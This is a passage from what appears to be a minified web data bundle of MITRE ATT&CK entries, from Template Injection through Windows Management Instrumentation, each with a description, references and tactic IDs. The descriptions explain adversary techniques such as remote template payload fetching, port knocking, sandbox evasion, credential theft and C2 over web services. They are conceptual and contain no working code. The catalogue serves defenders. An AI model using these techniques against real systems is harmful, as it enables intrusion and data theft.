non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and\u002For .VBS.",external_references:[{source_name:b,external_id:Gm,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1080"},{external_id:"CAPEC-562",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F562.html"},{url:"https:\u002F\u002Frewtin.blogspot.ch\u002F2017\u002F11\u002Fabusing-user-shares-for-efficient.html",description:"Routin, D. (2017, November 13). Abusing network shares for efficient lateral movements and privesc (DirSharePivot). Retrieved April 12, 2018.",source_name:"Retwin Directory Share Pivot"}],tactics:[x]},{id:Gn,"object-type":a,name:"Template Injection",description:"Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fprevious-versions\u002Foffice\u002Fdeveloper\u002Foffice-2007\u002Faa338205(v=office.12)'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sans.org\u002Freading-room\u002Fwhitepapers\u002Ftesting\u002Ftemplate-injection-attacks-bypassing-security-controls-living-land-38780'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These documents can be delivered via other techniques such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E and\u002For \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1080'\u003ETaint Shared Content\u003C\u002Fa\u003E and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.redxorblue.com\u002F2018\u002F07\u002Fexecuting-macros-from-docx-with-remote.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F10\u002Fdecoy-microsoft-word-document-delivers-malware-through-rat\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThis technique may also enable \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1187'\u003EForced Authentication\u003C\u002Fa\u003E by injecting a SMB\u002FHTTPS (or other credential prompting) URL and triggering an authentication attempt. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fforum.anomali.com\u002Ft\u002Fcredential-harvesting-and-malicious-file-delivery-using-microsoft-office-template-injection\u002F2104'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2017\u002F07\u002Ftemplate-injection.html'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fryhanson\u002Fphishery'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:Gn,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1221"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fprevious-versions\u002Foffice\u002Fdeveloper\u002Foffice-2007\u002Faa338205(v=office.12)",description:"Microsoft. (2014, July 9). Introducing the Office (2007) Open XML File Formats. Retrieved July 20, 2018.",source_name:"Microsoft Open XML July 2017"},{source_name:"SANS Brian Wiltse Template Injection",url:"https:\u002F\u002Fwww.sans.org\u002Freading-room\u002Fwhitepapers\u002Ftesting\u002Ftemplate-injection-attacks-bypassing-security-controls-living-land-38780",description:"Wiltse, B.. (2018, November 7). Template Injection Attacks - Bypassing Security Controls by Living off the Land. Retrieved April 10, 2019."},{url:"http:\u002F\u002Fblog.redxorblue.com\u002F2018\u002F07\u002Fexecuting-macros-from-docx-with-remote.html",description:"Hawkins, J. (2018, July 18). Executing Macros From a DOCX With Remote Template Injection. Retrieved October 12, 2018.",source_name:"Redxorblue Remote Template Injection"},{url:"https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F10\u002Fdecoy-microsoft-word-document-delivers-malware-through-rat\u002F",description:"Segura, J. (2017, October 13). Decoy Microsoft Word document delivers malware through a RAT. Retrieved July 21, 2018.",source_name:"MalwareBytes Template Injection OCT 2017"},{url:"https:\u002F\u002Fforum.anomali.com\u002Ft\u002Fcredential-harvesting-and-malicious-file-delivery-using-microsoft-office-template-injection\u002F2104",description:"Intel_Acquisition_Team. (2018, March 1). Credential Harvesting and Malicious File Delivery using Microsoft Office Template Injection. Retrieved July 20, 2018.",source_name:"Anomali Template Injection MAR 2018"},{url:"https:\u002F\u002Fblog.talosintelligence.com\u002F2017\u002F07\u002Ftemplate-injection.html",description:"Baird, S. et al.. (2017, July 7). Attack on Critical Infrastructure Leverages Template Injection. Retrieved July 21, 2018.",source_name:"Talos Template Injection July 2017"},{url:gc,description:"Hanson, R. (2016, September 24). phishery. Retrieved July 21, 2018.",source_name:"ryhanson phishery SEPT 2016"}],tactics:[d]},{id:gE,"object-type":a,name:"Traffic Signaling",description:"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1205\u002F001'\u003EPort Knocking\u003C\u002Fa\u003E), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.giac.org\u002Fpaper\u002Fgcih\u002F342\u002Fhandle-cd00r-invisible-backdoor\u002F103631'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1556\u002F004'\u003ENetwork Device Authentication\u003C\u002Fa\u003E for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.cisco.com\u002Fsecurity\u002Fevolution-of-attacks-on-cisco-ios-devices'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2015\u002F09\u002Fsynful_knock_-_acis.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601\u002F001'\u003EPatch System Image\u003C\u002Fa\u003E due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.bleepingcomputer.com\u002Fnews\u002Fsecurity\u002Fryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.amd.com\u002Fsystem\u002Ffiles\u002FTechDocs\u002F20213.pdf'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:gE,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1205"},{url:Go,description:Gp,source_name:Gq},{source_name:ap,url:aq,description:ar},{source_name:xv,url:xw,description:xx},{source_name:K,url:L,description:M},{source_name:"Bleeping Computer - Ryuk WoL",url:"https:\u002F\u002Fwww.bleepingcomputer.com\u002Fnews\u002Fsecurity\u002Fryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices\u002F",description:"Abrams, L. (2021, January 14). Ryuk Ransomware Uses Wake-on-Lan To Encrypt Offline Devices. Retrieved February 11, 2021."},{source_name:"AMD Magic Packet",url:"https:\u002F\u002Fwww.amd.com\u002Fsystem\u002Ffiles\u002FTechDocs\u002F20213.pdf",description:"AMD. (1995, November 1). Magic Packet Technical White Paper. Retrieved February 17, 2021."},{source_name:"GitLab WakeOnLAN",url:"https:\u002F\u002Fgitlab.com\u002Fwireshark\u002Fwireshark\u002F-\u002Fwikis\u002FWakeOnLAN",description:"Perry, David. (2020, August 11). WakeOnLAN (WOL). Retrieved February 17, 2021."}],tactics:[d,k,o],subtechniques:[Gr]},{id:Gt,"object-type":a,name:"Transfer Data to Cloud Account",description:"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers\u002Fdownloads and network-based exfiltration detection.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.justice.gov\u002Ffile\u002F1080281\u002Fdownload'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ",external_references:[{source_name:b,external_id:Gt,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1537"},{source_name:"DOJ GRU Indictment Jul 2018",description:"Mueller, R. (2018, July 13). Indictment - United States of America vs. VIKTOR BORISOVICH NETYKSHO, et al. Retrieved September 13, 2018.",url:"https:\u002F\u002Fwww.justice.gov\u002Ffile\u002F1080281\u002Fdownload"}],tactics:[J]},{id:gF,"object-type":a,name:"Trusted Developer Utilities Proxy Execution",description:"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2016\u002F11\u002F17\u002Fbypassing-application-whitelisting-by-using-dnx-exe\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2016\u002F11\u002F21\u002Fbypassing-application-whitelisting-by-using-rcsi-exe\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.exploit-monday.com\u002F2016\u002F08\u002Fwindbg-cdb-shellcode-runner.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FOtherMSBinaries\u002FTracker\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.",external_references:[{source_name:b,external_id:gF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1127"},{url:"https:\u002F\u002Fenigma0x3.net\u002F2016\u002F11\u002F17\u002Fbypassing-application-whitelisting-by-using-dnx-exe\u002F",description:"Nelson, M. (2017, November 17). Bypassing Application Whitelisting By Using dnx.exe. Retrieved May 25, 2017.",source_name:"engima0x3 DNX Bypass"},{url:"https:\u002F\u002Fenigma0x3.net\u002F2016\u002F11\u002F21\u002Fbypassing-application-whitelisting-by-using-rcsi-exe\u002F",description:"Nelson, M. (2016, November 21). Bypassing Application Whitelisting By Using rcsi.exe. Retrieved May 26, 2017.",source_name:"engima0x3 RCSI Bypass"},{url:"http:\u002F\u002Fwww.exploit-monday.com\u002F2016\u002F08\u002Fwindbg-cdb-shellcode-runner.html",description:"Graeber, M. (2016, August 15). Bypassing Application Whitelisting by using WinDbg\u002FCDB as a Shellcode Runner. Retrieved May 26, 2017.",source_name:"Exploit Monday WinDbg"},{source_name:"LOLBAS Tracker",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FOtherMSBinaries\u002FTracker\u002F",description:"LOLBAS. (n.d.). Tracker.exe. Retrieved July 31, 2019."}],tactics:[d],subtechniques:[Gu]},{id:Gw,"object-type":a,name:"Trusted Relationship",description:"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E used by the other party for access to internal network systems may be compromised and used.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fus-cert.cisa.gov\u002FAPTs-Targeting-IT-Service-Provider-Customers'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:Gw,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199"},{source_name:"CISA IT Service Providers",url:"https:\u002F\u002Fus-cert.cisa.gov\u002FAPTs-Targeting-IT-Service-Provider-Customers",description:"CISA. (n.d.). APTs Targeting IT Service Provider Customers. Retrieved November 16, 2020."}],tactics:[q]},{id:Gx,"object-type":a,name:"Two-Factor Authentication Interception",description:"Adversaries may target two-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources. Use of two or multi-factor authentication (2FA or MFA) is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for two-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdl.mandiant.com\u002FEE\u002Fassets\u002FPDF_MTrends_2011.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgcn.com\u002Farticles\u002F2011\u002F06\u002F07\u002Frsa-confirms-tokens-used-to-hack-lockheed.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOther methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and\u002For service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.trendmicro.com\u002Fcloud-content\u002Fus\u002Fpdfs\u002Fsecurity-intelligence\u002Fwhite-papers\u002Fwp-finding-holes-operation-emmental.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:Gx,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1111"},{url:"https:\u002F\u002Fdl.mandiant.com\u002FEE\u002Fassets\u002FPDF_MTrends_2011.pdf",description:"Mandiant. (2011, January 27). Mandiant M-Trends 2011. Retrieved January 10, 2016.",source_name:"Mandiant M Trends 2011"},{url:"https:\u002F\u002Fgcn.com\u002Farticles\u002F2011\u002F06\u002F07\u002Frsa-confirms-tokens-used-to-hack-lockheed.aspx",description:"Jackson, William. (2011, June 7). RSA confirms its tokens used in Lockheed hack. Retrieved September 24, 2018.",source_name:"GCN RSA June 2011"},{url:FF,description:FG,source_name:FH}],tactics:[r]},{id:X,"object-type":a,name:"Unsecured Credentials",description:"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and\u002For misplaced in many locations on a system, including plaintext files (e.g. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F003'\u003EBash History\u003C\u002Fa\u003E), operating system or application-specific repositories (e.g. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F002'\u003ECredentials in Registry\u003C\u002Fa\u003E), or other specialized files\u002Fartifacts (e.g. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F004'\u003EPrivate Keys\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:X,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552"}],tactics:[r],subtechniques:[Gy,GA,GC,GH,GJ,GL,GN]},{id:GP,"object-type":a,name:"Unused\u002FUnsupported Cloud Regions",description:"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\n\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\n\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.\n\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1496'\u003EResource Hijacking\u003C\u002Fa\u003E, which can cost organizations substantial amounts of money over time depending on the processing power used.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.cloudsploit.com\u002Fthe-danger-of-unused-aws-regions-af0bf1b878fc'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:GP,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1535"},{description:BY,url:BZ,source_name:B_}],tactics:[d]},{id:bg,"object-type":a,name:"Use Alternate Authentication Material",description:"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcsrc.nist.gov\u002Fglossary\u002Fterm\u002Fauthentication'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcsrc.nist.gov\u002Fglossary\u002Fterm\u002FMulti_Factor-Authentication'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0006'\u003ECredential Access\u003C\u002Fa\u003E techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",external_references:[{source_name:b,external_id:bg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550"},{source_name:"NIST Authentication",url:"https:\u002F\u002Fcsrc.nist.gov\u002Fglossary\u002Fterm\u002Fauthentication",description:"NIST. (n.d.). Authentication. Retrieved January 30, 2020."},{source_name:"NIST MFA",url:"https:\u002F\u002Fcsrc.nist.gov\u002Fglossary\u002Fterm\u002FMulti_Factor-Authentication",description:"NIST. (n.d.). Multi-Factor Authentication (MFA). Retrieved January 30, 2020."},{url:bK,description:bL,source_name:bM}],tactics:[d,x],subtechniques:[GQ,GS,GX,GZ]},{id:bV,"object-type":a,name:"User Execution",description:"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E.\n\nWhile \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204'\u003EUser Execution\u003C\u002Fa\u003E frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1534'\u003EInternal Spearphishing\u003C\u002Fa\u003E.",external_references:[{source_name:b,external_id:bV,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204"}],tactics:[p],subtechniques:[G$,Hb,Hd]},{id:Y,"object-type":a,name:"Valid Accounts",description:"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fdn535501.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:Y,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078"},{external_id:Hf,source_name:c,url:Hg},{url:Hh,description:Hi,source_name:Hj},{url:bK,description:bL,source_name:bM}],tactics:[d,k,u,q],subtechniques:[Hk,Hm,Ho,Hq]},{id:Hs,"object-type":a,name:"Video Capture",description:"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1113'\u003EScreen Capture\u003C\u002Fa\u003E due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fobjective-see.com\u002Fblog\u002Fblog_0x25.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1125",external_id:Hs},{external_id:jU,source_name:c,url:jV},{url:"https:\u002F\u002Fobjective-see.com\u002Fblog\u002Fblog_0x25.html",description:"Patrick Wardle. (n.d.). Retrieved March 20, 2018.",source_name:"objective-see 2017 review"}],tactics:[m]},{id:bW,"object-type":a,name:"Virtualization\u002FSandbox Evasion",description:"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497'\u003EVirtualization\u002FSandbox Evasion\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors. \n\nAdversaries may use several methods to accomplish \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497'\u003EVirtualization\u002FSandbox Evasion\u003C\u002Fa\u003E such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n",external_references:[{source_name:b,external_id:bW,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1497"},{source_name:"Unit 42 Pirpi July 2015",url:"https:\u002F\u002Funit42.paloaltonetworks.com\u002Fups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload\u002F",description:"Falcone, R., Wartell, R.. (2015, July 27). UPS: Observations on CVE-2015-3113, Prior Zero-Days and the Pirpi Payload. Retrieved April 23, 2019."}],tactics:[d,i],subtechniques:[Ht,Hv,Hx]},{id:dw,"object-type":a,name:"Weaken Encryption",description:"Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.cisco.com\u002Fsecurity\u002Fevolution-of-attacks-on-cisco-ios-devices'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601'\u003EModify System Image\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1600\u002F001'\u003EReduce Key Space\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1600\u002F002'\u003EDisable Crypto Hardware\u003C\u002Fa\u003E, an adversary can negatively effect and\u002For eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:dw,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1600"},{source_name:ap,url:aq,description:ar},{source_name:K,url:L,description:M}],tactics:[d],subtechniques:[Hz,HB]},{id:bX,"object-type":a,name:"Web Service",description:"Adversaries may use an existing, legitimate external Web service as a means for relaying data to\u002Ffrom a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL\u002FTLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",external_references:[{source_name:b,external_id:bX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1102"},{url:f,description:g,source_name:h}],tactics:[o],subtechniques:[HD,HF,HH]},{id:HJ,"object-type":a,name:"Windows Management Instrumentation",description:"Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FServer_Message_Block'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and Remote Procedure Call Service (RPCS) \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc787851.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E for remote access. RPCS operates over port 135. 